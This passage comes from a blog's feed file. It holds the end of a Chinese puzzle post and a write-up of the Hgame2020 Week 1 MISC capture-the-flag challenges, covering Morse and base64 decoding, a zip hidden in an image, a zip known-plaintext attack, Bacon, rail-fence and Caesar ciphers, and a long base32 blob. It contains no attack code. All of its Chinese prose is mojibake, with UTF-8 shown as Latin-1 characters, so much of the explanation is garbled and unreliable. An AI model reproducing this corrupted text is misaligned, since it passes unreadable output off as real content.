çš„å‘¢ã€‚</li><li>å–µå–µå¶å°”ä¼šå’Œå°ä¼™ä¼´å‘é‚®ä»¶äº¤æµã€‚</li><li>å–µå–µå¶å°”ç”¨<code>PhotoShop</code>ä¿®ä¿®å›¾ä»€ä¹ˆçš„ï¼Œå¯èƒ½è¿˜ä¼šå¾€å›¾ç‰‡é‡Œè—ç‚¹ä»€ä¹ˆæœ‰æ„æ€çš„ä¸œè¥¿ï¼Œå½“ç„¶å·¥å…·ä¸åªæ˜¯PSã€‚</li><li>åå…­è¿›åˆ¶ç¼–è¾‘å™¨åœ¨æ‰‹ï¼Œæœ‰å¯èƒ½å“ªå¤©ä¸€ä¸å°å¿ƒæŠŠæ–‡ä»¶æ”¹é”™äº†å°±æ‰“ä¸å¼€äº†æˆ–è€…è¯´æŸåäº†ã€‚</li><li>äºŒç»´ç æ˜¯ä¸ªå¥½ä¸œè¥¿ï¼Œèƒ½ä¼ é€’çš„ä¿¡æ¯ä¸åªæ˜¯ç½‘å€ï¼Œè¿˜æœ‰â€¦â€¦ä½†æ˜¯å‰ææ˜¯ä½ èƒ½æ‰¾åˆ°å®ƒã€‚</li><li>å–µå–µå–œæ¬¢ç”¨<code>Python</code>æ¥ç ä»£ç ï¼Œå¾ˆå¤šç°æˆçš„åº“è´¼æ–¹ä¾¿ã€‚è€Œä¸”ç¼–è¯‘åâ€¦â€¦</li><li>ä¸­æ–‡çš„è¯æœ‰å¯èƒ½éœ€è¦å€ŸåŠ©<code>Unicode</code>ç¼–ç ã€‚</li><li>ä¸€æ­¥æ­¥æ·±å…¥è¿˜ä¼šæœ‰è¿›ä¸€æ­¥çš„æç¤ºï¼Œå¤‡æ³¨æ˜¯ä¸ªå¥½ä¸œè¥¿ã€‚</li><li>ï¼ˆæˆ‘ä¹Ÿä¸è®°å¾—äº†ï¼Œè‡ªå·±æƒ³å§2333</li></ol><h3 id="Just-have-funï¼"><a href="#Just-have-funï¼" class="headerlink" title="Just have funï¼"></a><strong><em>Just have funï¼</em></strong></h3><p><strong>æœ‰é—®é¢˜æ¬¢è¿ç•™è¨€ï¼Œæˆ–è€…ç§æˆ³å‘€ï¼</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Life </tag>
            
            <tag> CTF </tag>
            
            <tag> çº¢åŒ…é—¯å…³ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | Hgame2020 Week1 WriteUp</title>
      <link href="2020/01/23/CTF_Hgame2020/"/>
      <url>2020/01/23/CTF_Hgame2020/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™å‡ å¤©ç©äº†ç©æ­å·ç”µå­ç§‘æŠ€å¤§å­¦çš„<strong>Hgame2020</strong>ï¼Œè¿˜åˆ«è¯´ï¼Œæœ‰ç‚¹æ„æ€2333ã€‚</p><p><strong>å¹³å°ç½‘å€ï¼š</strong></p><p><a href="https://hgame.vidar.club/">https://hgame.vidar.club/</a></p><p>Flagæ ¼å¼ï¼š<code>hgame{.+} </code> </p><br><p><strong>20200125 æ›´æ–°ï¼š</strong></p><p>å®˜æ–¹WPåœ°å€ï¼š<a href="https://github.com/vidar-team/Hgame2020_writeup">https://github.com/vidar-team/Hgame2020_writeup</a></p><hr><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="ç­¾åˆ°é¢˜"><a href="#ç­¾åˆ°é¢˜" class="headerlink" title="ç­¾åˆ°é¢˜"></a>ç­¾åˆ°é¢˜</h3><pre class="language-none"><code class="language-none">Li0tIC4uLi0tIC4tLi4gLS4tLiAtLS0tLSAtLSAuIC4uLS0uLSAtIC0tLSAuLi0tLi0gLi4tLS0gLS0tLS0gLi4tLS0gLS0tLS0gLi4tLS4tIC4uLi4gLS0uIC4tIC0tIC4uLi0t</code></pre><p>base64è§£ç å¾—åˆ°</p><p><code>.-- ...-- .-.. -.-. ----- -- . ..--.- - --- ..--.- ..--- ----- ..--- ----- ..--.- .... --. .- -- ...--</code></p><p>ä¸€çœ‹å°±æ˜¯æ‘©æ–¯ç”µç ï¼ŒåŠ å…¥åˆ†éš”ç¬¦åè§£ç å¾—åˆ°flag</p><p><code>W3LC0ME_TO_2020_HGAM3</code></p><blockquote><p>åœ¨çº¿è§£å¯†æ‘©æ–¯å¯†ç  <a href="http://www.atool9.com/morse.php">www.atool9.com/morse.php</a></p></blockquote><h3 id="å£çº¸"><a href="#å£çº¸" class="headerlink" title="å£çº¸"></a>å£çº¸</h3><p>è§£å‹å¾—åˆ°å›¾ç‰‡<code>Pixiv@ç´”ç™½å¯æ†.jpg</code>ï¼Œforemostæå–å¾—åˆ°ä¸€ä¸ªzipå‹ç¼©æ–‡ä»¶ã€‚å¤‡æ³¨æç¤º <code>Password is picture ID.</code></p><p><img src="/2020/01/23/CTF_Hgame2020/misc_wallpaper.png" alt="misc_wallpaper"></p><p>æœ¬æ¥è¿˜ä»¥ä¸ºæ˜¯åœ¨å›¾ç‰‡çš„æ–‡ä»¶é‡Œï¼Œè€Œä¸”è¿˜æ‰¾åˆ°äº†ä¸€ä¸ªidå±æ€§ï¼Œç„¶è€Œå¹¶ä¸æ˜¯ã€‚</p><p>ä¸Šç½‘æŸ¥äº†ä¸€ä¸‹<code>ç´”ç™½å¯æ†</code>ï¼Œå‘ç°æ˜¯Pç«™ç”»å®¶ï¼Œçœ‹äº†ä¸€ç¯‡ä»‹ç»åŸæ¥æ¯å¼ å›¾ç‰‡æœ‰ä¸ªç¼–å·æ¥ç€ã€‚</p><p>è¯•äº†è¯•ç™¾åº¦æœå›¾ï¼Œå‡ºæ¥çš„ç”»é£æœ‰ç‚¹ä¸å¯¹åŠ²emmmã€‚å¹²è„†ç›´æ¥ä¸ŠPç«™æœï¼Œç„¶ååœ¨é¡µé¢ä¸Šæ‰¾åˆ°äº†è¿™å¼ å›¾ã€‚</p><p><img src="/2020/01/23/CTF_Hgame2020/misc_wallpaper2.png" alt="misc_wallpaper2"></p><p>ï¼ˆè¿˜åˆ«è¯´ï¼ŒæŒºå¥½çœ‹çš„å“‡ï¼Œè¿˜æ˜¯ä¸ªä¸­å›½ç”»å¸ˆå–µã€‚</p><p><strong>å¤©æ„</strong> <a href="https://www.pixiv.net/artworks/76953815">https://www.pixiv.net/artworks/76953815</a></p><p>å¾—åˆ°ID <code>76953815</code>ï¼Œä½œä¸ºå¯†ç è§£å‹<code>flag.txt</code>ï¼ˆè¿™ä¹ˆçŸ­è¿˜å…¨æ•°å­—ï¼Œå…¶å®å¯ä»¥æš´åŠ›ç ´è§£çš„ï¼‰ï¼Œå¾—åˆ°</p><pre class="language-none"><code class="language-none">\u68\u67\u61\u6d\u65\u7b\u44\u6f\u5f\u79\u30\u75\u5f\u4b\u6e\u4f\u57\u5f\u75\u4e\u69\u43\u30\u64\u33\u3f\u7d</code></pre><p>Unicodeå•¦ï¼Œè½¬ASCIIï¼ˆç”¨çš„æ˜¯<strong>NATIVEè½¬ASCII</strong>æ¥ç€ï¼‰å¾—åˆ°flag</p><p><code>hgame{Do_y0u_KnOW_uNiC0d3?}</code></p><hr><h3 id="å…‹è‹é²ç¥è¯"><a href="#å…‹è‹é²ç¥è¯" class="headerlink" title="å…‹è‹é²ç¥è¯"></a>å…‹è‹é²ç¥è¯</h3><p>æ˜æ–‡æ”»å‡»å¾—åˆ°äº†è§£å¯†åçš„zipæ–‡ä»¶ã€‚</p><p><img src="/2020/01/23/CTF_Hgame2020/misc_kesulu.png"></p><p>å¾—åˆ°åŠ å¯†çš„ <code>The Call of Cthulhu.doc</code>æ–‡ä»¶ã€‚æ ¹æ® <code>Bacon.txt</code>æ–‡ä»¶æç¤ºå¯»æ‰¾å¯†ç ã€‚</p><pre class="language-none"><code class="language-none">of SuCh GrEAt powers OR beiNGS tHere may BE conCEivAbly A SuRvIval oF HuGely REmOTE periOd.*Password in capital letters.</code></pre><p>ç„¶è€Œä¸æˆåŠŸï¼Œä¸çŸ¥é“æ€ä¹ˆåšä¸‹å»äº†å˜¤å˜¤å˜¤ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> s<span class="token operator">=</span><span class="token string">'of SuCh GrEAt powers OR beiNGS tHere may BE conCEivAbly A SuRvIval oF HuGely REmOTE periOd'</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> s1<span class="token operator">=</span><span class="token punctuation">[</span>i <span class="token keyword">for</span> i <span class="token keyword">in</span> s <span class="token keyword">if</span> i<span class="token operator">&gt;=</span><span class="token string">'A'</span> <span class="token keyword">and</span> i<span class="token operator">&lt;=</span><span class="token string">'Z'</span><span class="token punctuation">]</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> s1<span class="token punctuation">[</span><span class="token string">'S'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'G'</span><span class="token punctuation">,</span> <span class="token string">'E'</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'O'</span><span class="token punctuation">,</span> <span class="token string">'R'</span><span class="token punctuation">,</span> <span class="token string">'N'</span><span class="token punctuation">,</span> <span class="token string">'G'</span><span class="token punctuation">,</span> <span class="token string">'S'</span><span class="token punctuation">,</span> <span class="token string">'H'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'E'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'E'</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'S'</span><span class="token punctuation">,</span> <span class="token string">'R'</span><span class="token punctuation">,</span> <span class="token string">'I'</span><span class="token punctuation">,</span> <span class="token string">'F'</span><span class="token punctuation">,</span> <span class="token string">'H'</span><span class="token punctuation">,</span> <span class="token string">'G'</span><span class="token punctuation">,</span> <span class="token string">'R'</span><span class="token punctuation">,</span> <span class="token string">'E'</span><span class="token punctuation">,</span> <span class="token string">'O'</span><span class="token punctuation">,</span> <span class="token string">'T'</span><span class="token punctuation">,</span> <span class="token string">'E'</span><span class="token punctuation">,</span> <span class="token string">'O'</span><span class="token punctuation">]</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token string">'SCGEAORNGSHBECEAASRIFHGREOTEO'</span></code></pre><p><strong>20200125 æ›´æ–°ï¼š</strong></p><p>çœ‹äº†å®˜æ–¹WPæ‰çŸ¥é“<code>Bancon</code>æŒ‡çš„æ˜¯åŸ¹æ ¹å¯†ç ï¼Œæˆ‘è¿˜ä»¥ä¸ºæ˜¯å’¸è‚‰/ç†çŒªè‚‰æ¥ç€ã€‚ã€‚</p><p>æ ¹æ®å¤§å°å†™è½¬ä¸ºaæˆ–bï¼Œæ¯”å¦‚å°å†™ä¸ºaï¼Œå¤§å†™ä¸ºbã€‚</p><p><img src="/2020/01/23/CTF_Hgame2020/misc_kesulu2.png" alt="å®˜æ–¹WP"></p><p>flagéšè—åœ¨æœ€åemmm</p><p>Ctrl+DæŠŠéšè—å–æ¶ˆæ‰å°±çœ‹åˆ°äº†ã€‚</p><p><code>hgame{Y0u_h@Ve_F0Und_mY_S3cReT}</code></p><hr><h3 id="ç­¾åˆ°é¢˜ProPlus"><a href="#ç­¾åˆ°é¢˜ProPlus" class="headerlink" title="ç­¾åˆ°é¢˜ProPlus"></a>ç­¾åˆ°é¢˜ProPlus</h3><p><code>Password.txt</code>æç¤ºäº†</p><pre class="language-none"><code class="language-none">Rdjxfwxjfimknâ€‚z,tsâ€‚wntziâ€‚xtjrwmâ€‚xsfjtâ€‚jmâ€‚ywtâ€‚rtntwhfâ€‚fâ€‚yâ€‚â€‚â€‚hâ€‚jnsxfâ€‚qjFjfâ€‚jnbâ€‚â€‚rgâ€‚fiyykwtbsnkmâ€‚tmâ€‚â€‚xaâ€‚jsdwqjfmkjyâ€‚wlviHtqzqsGsffywjjyynfâ€‚yssmâ€‚xfjypnyihjn.JRFVJYFZVRUAGMAI</code></pre><blockquote><ul><li>Three fences first, Five Caesar next. English sentense first,  zip password next.</li></ul></blockquote><p>ä¸€å¼€å§‹è¿˜ä»¥ä¸ºå‰é¢çš„æ˜¯3ä¸ªæ …æ ï¼Œåé¢çš„æ˜¯5ä¸ªå‡¯æ’’ï¼Œç„¶åè¯•äº†åŠå¤©éƒ½ä¸å¯¹ã€‚</p><p>çªç„¶ä¸€æƒ³åº”è¯¥æ˜¯å…ˆæ …æ å†å‡¯æ’’ï¼Œä¸€è¯•æœç„¶ã€‚</p><p>å…ˆè§£å¯†zipå¯†ç ï¼šæ …æ å¾—åˆ°<code>JFARZGFVMVRAJUIY</code>ï¼Œå‡¯æ’’å¾—åˆ°å¯†ç  <code>EAVMUBAQHQMVEPDT</code>ã€‚è§£å‹å¾—åˆ° <code>OK.txt</code>ã€‚</p><p>åŒæ—¶ä¸Šé¢çš„é‚£å¥è¯åŒç†è§£å¯†å¾—åˆ°</p><blockquote><p>Manyâ€‚yearsâ€‚laterâ€‚asâ€‚heâ€‚facedâ€‚theâ€‚firingâ€‚squad,â€‚Colonelâ€‚Aurelianoâ€‚Buendiaâ€‚wasâ€‚toâ€‚rememberâ€‚thatâ€‚distantâ€‚afternoonâ€‚whenâ€‚hisâ€‚fatherâ€‚tookâ€‚himâ€‚toâ€‚discoverâ€‚ice.</p></blockquote><p>emmmä¸å¤§ç†è§£ï¼Œä¸ç®¡äº†ã€‚</p><p>çœ‹æ–‡ä»¶æ˜¯Ook!ç¼–ç ï¼Œè§£å¯†å¾—åˆ°base32ç¼–ç ã€‚</p><pre class="language-none"><code class="language-none">data:text;base32,NFLEET2SO4YEWR3HN5AUCQKBJZJVK2CFKVTUCQKBKFIUCQKBIVCUGQKZIFAUCRCPINCW6S2BIFAU6V2VNRCVCVSSGRXE6MTBKM3DIRKOO53UIMZPGB3DOV3ZINJVOOCHMNCTQ33LMJFXEQKPHBQSW3CBKNLC6MRTIFAUIKZVMM4WIQKBIRVWOQ2FIF3UCY2NIFIUCK2ZIFTUCOCBIZCECSKBKBDUCSKBMZGUCUKBJ5AUI2DHIFAUQN2ZJU2GKL3WNIXWINBQM5CTANJZOZHG2YLYLJQW6L2KMIYXGM3YJMYFIVRWK52G25LNMFYGMYKZF5GFUMKRHF3TMY2WLBQXC4DNOVLVO4KQPFLTSYSOHBJXIRJRMVWHEWTSOBWXCWBSNVIHSMTEKVIGGT3OIZLDE4LRLJZGY3DRNI4GY5SXPJTEK4SSJZMHAYJSME3FU4LMHFYGUODUNZLEIM2EOB4FMZDROFWWCNK2MFXS6STCGFZTG6CLGBKFMNSXORWXK3LBOBTGCWJPJRNDCUJZO43GGVSYMFYXA3LVK5LXCUDZK44WETRYKN2EKMLFNRZFU4TQNVYVQMTNKB4TEZCWJ5FU66BRNRXHON2OJRAXGVLVOR5HGTCJMJ3XMNLNFNVUE2SDFM3XC3LHPFCVKTLOGBUE2WKUGNSFKMCIKF4WQ2ZLNNFGSQ2PF5ZG2ZZWI5KU22RQNBRVCUJTORRTCSCRPFUGWT3LJRUVGRZYOIZHGNSHIVEWQMDYMNJVCM3IMYYTGULXNBCUW3KMPFJUOOCMGZ2TMV2BJFUFK6DGKNAXU2DGKYZVIR2XHBEXCULUGBIXAOCPPJLEU6BXKVRDGRCPKI4WI2LEJZDGMYKFKBUDEYLQMVGGC2TFGRNHSUDWONKHA33RG5AWYOKPNJJEY6DCKVRDGVCPKE4TS3LEJZDFQWKFF5YDAYKKMFFWC6TFGZNHSRDWON5HI4DROJAW4OKPNZIUYQSYLBRG4VCQKFHDK3TEHFFFKWKVF5XTANSGLJFXCN3EGZFDMQTWJUXXK4CLNZBW45CDNZITOTSVLBGHMUSQKFHDK3RZGFFFKNCVHFXVKK2ILJYW2NDEOFHDOQTWJEVXKNKPNVBW45CDNZ3TOTSVNZEHIUTWMNGTKSBRGJFDAMCWHFXVCK2ILJYWYNDUOFHDO2DOJEVSW6CPNVUXC43VNM4TC6TUKJDGGMTJNVZEMODEJQZVMTZSGMYTESRQGBLFM5BSNZHW2ZTRN5VGWMCVHFQXM2TQMM3HAKZQFN2TKT3NINYXM5KVGUYHUZDEIVRW22LOOJLDQZCMNZSE4MTOHEYUUVJUKZLDSNTOJ5WWE4DPIRZTEVJZMF3GU4DDGVYHKOBPOVYEW3SDOF3HIVJVGB4GITSJMRWXS5TSKY4FMTDOORHDC3TEHFFFKWLEKY4XC3SPNVGHA4CEJUZFQOJWNZUXAYZZOJ2XG6TUOBYXERDRKB2FKNKVPBTE4322NV4WM3SXHAYUI3DUHE4W2ZCOIZLFSZC2F5YW4S3NJQ2XIQSNK5RDQNSYOVYWG5DWOZZVI4DPOFZEY4CQMRRTOVKSLBHG64DRPBTEQUZZGFKHI5BZMRUWITSGKZRGI4D2OBXDM4KJGVHEMUCXOI2DMWCPOFTHIUDSOVKHAZ3SOI3HMTKXPBUDSSZWJY2WSQ2CNJBVGTKZMZJXK2TFLFTWOWLXNNVEOSBQOJXTG3KJJFDU2SSJPBUDSSZWJY2WSQ2CNJBVGTKZMZJXK2TFLFTWOWLXNNVEOSBQOJXTG3KJJFDU2SSJPBUDSSZWJY2WSQ2CNJBVGTKZMZJXK2TFLFTWOWLXNNVEOSBQOJXTG3ZUGNUEOULDM4YG6MKOIRMGIZCTKZZG6UKSIRFUCUSEOFAU4RDRIFDEIS2BKJCHCQKOIRYUCRSEJNAVERDRIFHEI4KBIZCEWQKSIRYUCTSEOFAUMRCLIFJEI4KBJZCHCQKGIRFUCUSEOFAU4RDRIFDEIS2BKJCHCQKOIRYUCRSEJNAVERDRIFHEI4KBIZCEWQKSIRYUCTSEOFBUQYKFI42TKM2ZJZ4UOSLDPFLHESTNOQ3XU5DFKNFHK2TCNFYHGWDCNJFVOTLMMEZWETBSGU2G4NDUMFEW26DQOJHDKNDZKZZEU3LUG55HIZKTJJ2WUYTJOBZVQYTKJNLU23DBGNREYMRVGRXDI5DBJFWXQ4DSJY2TI6KWOJFG25BXPJ2GKU2KOVVGE2LQONMGE2SLK5GWYYJTMJGDENJUNY2HIYKJNV4HA4SOGU2HSVTSJJWXIN32ORSVGSTVNJRGS4DTLBRGUS2XJVWGCM3CJQZDKNDOGR2GCSLNPBYHETRVGR4VM4SKNV2DO6TUMVJUU5LKMJUXA42YMJVEWV2NNRQTGYSMGI2TO3RZOBTHOQ3TMN3WYYSVGUVW4VDQIFTCWQTVNNKWWSDXINDUCTRZIEZVGS2TIR3UERDHI4VWOYTIJBFEENCBNB3UIZCROQ2GU22BHBAVCNCCOVXVOMCUPFAVOQKJHBATGVKMKNGDKQKEIFCSWQLCOFDHARRYIFBGOQ3GIFHDC2JQM4VUCQLXIJ3HISBLOAVUUMSZLFRGYU2GGFQWYN3CMRSWU2DJJJSTSMRZGU3HI2CTJBMSWMKUK42WK2CUK5NHG2SWOZFHKZBLF5NFO2DJIN3FKOLMLBMTIK3MMJKTKWLJLB3GI5TFMVZFSVLIGJIHIVJROVMG6VJRNVRESMLCPFRG4ZTWGJLG6WLHOIYVAWSWGJHVA4CXGFHVOSLMG4ZWEM3OOEZEMSLENI3VMTTCNQ3EMTS2NV4U4VZYNU2TGNZZNRQUOSKLHFKDEVTENJVDMVTUKRWGSSTFHEZDSNJWORUFGSCZFMYVIVZVMVUFIV22ONVFM5SKOVSCWL22K5UGSQ3WKU4WYWCZGQVWYYSVGVMWSWDWMR3GKZLSLFKWQMSQORKTC5KYN5KTC3LCJEYWE6LCNZTHMMSWOBUVCMKEI5UWQWLUHFDEEY3FNZKDGMCKGFIG4VCOKZZTOVLXNBFDSSKYKRJVQSDUGA4WIT3EKQ2TA6SWMJBTATJUKNSFGRRYGJWFEM3DKAZWM3SVJ5LE2MKXO52EIK2JNZKVEWCQOAYGIMKEMR5DKML2NRKE4MLTJFIWM2KKGEYFM6BWMRIGMULOKUVWITJRK55HIVCDIVXDA2DEJZFGGZJTKQYTANJRKBXFITSWONGFC6TIJIYUSWD2MFLEQZDXF5SCWZCRGVKXUVTCIMYFANDJMRJEMYZLNZJDGVKOGNIG4WCPKZGTGV3XNBBCWSLOLBJFQSDQGA4TSQ3EKQ2TA6SWMJHTCTTHGFBFGZSLM5GECTLXGVEFE33QON5FUSCXOVMEKM2ZIRIXS2BWIRVDEVKKJUVXATZZLF2UUK3XI5UGYRBQJBEG632TLI2VIZBWPBSFI5DHJZCEWSDPJ5TFEULLNJ4W4N3MNE3W4TCBMJDUKTCSMMVWS2CKJBWE6M3CIYZE6V2FGNGUSU3JGU4UERCTMZFWG5LNKB2GG42KOVMUC2CGPI3EOSDLOVITKZDDMZQTKWKUMR3UEQ2LNZVU2UCKMNWHUNTPGYYXS53NG5TVGRKVKBMWGZKTOBGG4MKCGFZGY6COGJATATLPMVTTIOLMINKFA4KUOZLUY2LGONJHM5LWPE4XKRTIKI3UWYTNGNFHAR3RMJXEITRRPJ5EGRKJLFHEWSTMLBRDKSTZOBSTIWLIIRBGYVKNOFXGCSTVMRGTGVCNJVMWG2LHNNVW4VSONJWG4NTQGVUEGRKNI5WFK6LRORZWWNKVF5RU2ULYM54XCR2SKN2FKM2PNVRHA3SHJVFVCUKTK5KHC3JRPF5HIUJZO54EGR2EINYVUVSHGJKGGNTCOVDVSWLXLJDEISTQI5YWE3SEJYYXU6SDIVEVSTSLJJWFQYRVJJ4XAZJTMFHESVDIKE4XA3JYGNATM22TPB2DQ6CFN53UERCNLFIWQMCZO5XHG52CIRGVSULIGBMXO3TTO5BEITKZKFUDAWLXNZZXOQSEJVMVC2BQLF3W443XIJCE2WKRNAYFS53OON3UERCNLFIWQMCZO5XHG52CIRGVSULIGBMXO3TTO5BEITKZKFUDAWLXNZ2GSRCVJBNGORCMK5BWGZDQI5MHA332NBHTAVSXJNNFKM3DIR4WY2JXHBJHQRCUGE3WCMKKO5XGCS3WIVGXCZTVIJYFG6DEOVGTK2DQGY4HIS3LGVKDSQSXNFLVMTZTKEYG6WJLGNDWG53XHFSVO3CUMM2TMZ3SKJGEY3SMN5RFKTLCMFVGKY2ZMV3EYU3QOVMTQUKWONWGY2TMGFHDMQ2NORJHMUCNMZKGW4CVGNHGKWKLGJJWS6D2GZWTKQKHK5ZTG3TNKBXXSVLVMJWXMTKFMJNFMWJVORKGIZ2EJRLWE2T2JAYEUT2YJZVFQ3SDMRXXC43DPFYHK52GNRZE4MJUNJYUK3SMGIYXC6TIJ4YFMV2LLJKTGY2EPFWGSNZYKJ4EIVBRG5QTCSTXNZQUW5SFJVUWI3CZMQYU43TQIJKHSWCUJZWE2Z2QKJQXQSBWOA2WQQ2FJVDTCWRTKRXVU22TFNQUOSJZKVVGITLXPBUHSS2DGZRXU3ZQKV4USL2GJRCWK4KYOVDUSULXLJLEQZCPNAZFUSZVJFRWSMLJJYYXU6SDIVEVSUDRPJ2W4UKUJFXDQVKNKI3HATZULJUGUQTLKVHDANKILJXXA22SFNFVOSJPKVIGGTKRNBTXS4KPGZSEITLZLB4VC6CIOJVWE4DOI5GUWUKRLBMG4ZCHNFWVESBUN5MWUMKTHF3XQRCHIRFW6N3QO5HXUWSUJFCDAV3TKIVXCZKZKFUEIQTUK5SDANSHLJCXM3LINFIFMSJTMJIDEWBVMRIEKTZSI5XE23RRMQ4WKMKXHFZVET3BLBBE2SKSNJRWSYSYMY4DC6CZM5TVSULLOJHTKUDROZHVKNCNIFKU4SLZLJWGGL32LBEGSU2GM5BUG2ZVNMVXKLZVNJTXQQSBO5UEUV3EPEXWIY3DJI2GCQKJMFKGWVCLG4XW25KQIVCUIQ2FNRFHUSRZKY4XU3SCM5BWQ4CDKNGTO3RLME2DI6RRKJBW2RBYOJ4EQUCVNY2SW6LVGY2FGWSPHBAVC2DJPJEDSST2MRSFUMDXMN3WGWLXOBCGY3KKGZ5HKNRUKRNHKNCBKF4GS6KIJZHHUZDUMQYXO43XMRMUC2CENRWU4NT2OU3DMVDQNE2UC53YNB4UQSSNPI4WYZBRO5VXUZBUIFUEIRTNJ43FI3JXGZ5HA2BVM42HO2CDJBGE2VBRNZSDCMDOPJHHOQTINJBGWT3BMJXDOSZXOJUEU2ZXO5BEGR2MJVTDA3SOGEYW4VCCPJBDKNTTIY4EG2JPKZRGENKQOBKDMM3RGFITIVZRLBTTERZYIZ2HI2ZLORIHEULUIRBUCQSEFNFTEMTZMZLW4MLPKVUEESKBNAXUMYTCGVIHAVBWHBEVCQLTIFIWM4LUORRXMMTQMRLUKSKBK5AUS5RZKUZHKZRXKV2WUQ2FIFCEGRJTGJYWEWCIHFYVQUTIINAUE2SDMI3VMTTSNIVTCTDHO5UECQL2NB2DS33NGE2TSYLMHF3VC3CNJU4DIWCWOI2XGQSSNUYE4L3EK4ZHAYRXOZIEOOCSO5UU642ZOBUEUSDCKE3TSMLCK5WHM5JQFNRHQRCEJFQTK2TNIVXWG5CUNYYFMOLFK4VXEYRXOZCUKTLIG5UU6WKTOB4DCT3CKFMDCMLCGZ2HM5JYO5MXQSCPJE3GQ4LOIVKVU5CEMYZVM5DRK4VTO6TYOZCWGSLKOJDUWWKTKIZDATZPMRLTC4DCG52FA3JYKF3XSR3VLE2WQS2IJRKTKOKGMZMGY5TRGIVTO6CCIREWKNDKNVCXCY3EKRWTARRZMRLSW4TCG53E2R2NKJ5GST3PMFYHQRSHMJITGOJRMJQWY5TVHA4GE6CIINETM6DJNVCWWZDUIR3DGVTUMFLSWN2UGRSDI4LBKNSWOVDRFNUDANLVGJHXA5KVKV5EIT2FIJUG4RCXMNUXKNKSKRGU2NCRI5DWGTS2PFFTO3CGJV3XU2CBLFNHOMLOJFZHKVKVPJCE6RKCNBXEIV3DNF2TKUSUJVGTIUKHI5RU4WTZJM3WYRSNO55GQQKZLJ3TC3SJOJ2VKVL2IRHUKQTINZCFOY3JOU2VEVCNJU2FCR2HMNHFU6KLG5WEMTLXPJUECWK2O4YW4SLSOVKVO6TENNHFCTDNGN4WG2LUPJYXK5BTMFFHIYLGG5FG2M3GOF3GQU2HKU4WC3SNOFQTOZTPK4YXCL3DNVQWIZLVF5DG6WSRGFYWG6LQG5YCW2BXMFYDSU3EOIYXCMZPK5UGQQ2XLIXUW3SPOI3EQZDRNUYXAK3TK5RGMK3BGJCUSWSYGBYWGNTSOJSDE2LCK5XCW6K2OQZTM4RUKVUGYUCXOB5EW3LVGM3EM5DBOYZUU3LOLBZHM6DBI5KU4YLOJVYWKNTGN5STE4LGKVXGCOLBOQXTC32ZKFWG2ZTZOB5HCK3IGNQXA5DBMZZEM3JTF5WXI2CDI5LDSS3OJ5YTMM3EN5WTC4BPONWWEZBLOEVUMSLEIRXHOS3DNNSWKWKPJVAVINSIKBSVKSSNF5RUCWK2IFXCWT3FNN2VGWSPHBAVCNSIKBRVKNKJHBRXOY2ZIFXDET3FGBYVGWRLGRAVCNSEKBRVKOKKHBZXOZCZIFVDAT3FGRYFGWRWGVAXO6KCKBZWGOKKMNVXUZBUIFUDAT3FGRYHSURVGVTTI52CKBXWGOJVKFVXUOLXIJUGYRCVLJ5EY5LHFM3FS4BSOMZXQ5TGLJXFIUSWK5EFOZTZMJTU6ZLGKNUDGTSKNZSDSSSVLFSFMOKKOVGTMNKOI5EGG23VMYZVK3CUNBLFQM3NLF5HE22FMNTHS2JRHFSGSZCOIZLGEZC2PJFXKULYGU4UWTDGGAZFUMBQKZLGQMLOHBWTIRDONYYG6ZD2KNNDGZSTKZDUQVTGKNRGUT3VKRJGQM2KJRXDSMKKKU2FMVRZGVWU2NRVIJEEQODPORTFQWLOKRJFMVZTK5RXS4TLJVSWMU3JGM4U43LEJZDFMWLELIXUU5KBGU2TSS2IMMYHCY3KMFJXC4DHGNEWMWKOOJZDC3RLLBCSWNCFKEZWSULVOBCHKQJQPA3TGZTSOZRXGS3ELFAWOUCVNBTFGZSZIJYHEMLWF5MFKNRUIV3XU2CRMVYEG5LHHB3TOWCYOJ3DQ42KMQ2ES2CQIVUGIU2QMNBHA4RROUXVQYZVGRKTI53IIFSXAQZLNMVXOTCULBZGMODVJI4XOSTIOZAWOZCTJBSEENLKGJ2XMWDGGVMVCN3XKJAWK4CDGZVSW52EKRMHEZRLOU2XQ52KPBVEGZZZKNDGIQRZM4ZHK5SXMY2WGVBXNNJHCQ2MMM4HAV22JN2W45BQGFSWE3ZYGVYWGM2ZK5SDQSSTMFFVQRLTNNFU2MSSGUXVQNKPO52TOSKTNYYUK6KKLE2EKY3UKRXDM5SDLJXGIMSFNZIEWVTNKNUHOTBVJNVE4MDFMMYU6YTTJRHSWRLQJZLFA2KXINBEQYSZGQVXEODOLJMGIZ2KKQ3G2WSFONRUGT2XOB5DSSDMJZ5HKN2DKRXGQS32LJITIRTTNBJG2NSQKBQTGSRSIYZWEQ2VGJYW26CMIZAWU5DPMNTFMNSUOM3XK52FGU2VGTLZK5HUEWCMKU2XK2T2NVYHUZDILIZXO3CKN5YGGU3ZKFXXUWSINY4WM2ZTKA2FGQKJGREFC52DIFCHQZ2DIFEHUQKFIFCGOQJULFAUCQRYO5BECRBUM5BUKQLXIFRU2QKRIEVVSQLHIE4ECRSEIFEUCUBPO5AUM3ZQNBKVU4TIGFWUCQKBIFAUESSSKU2UK4TLJJTWOZZ5HU======</code></pre><p>å†base32è§£å¯†å¾—åˆ°</p><pre class="language-none"><code 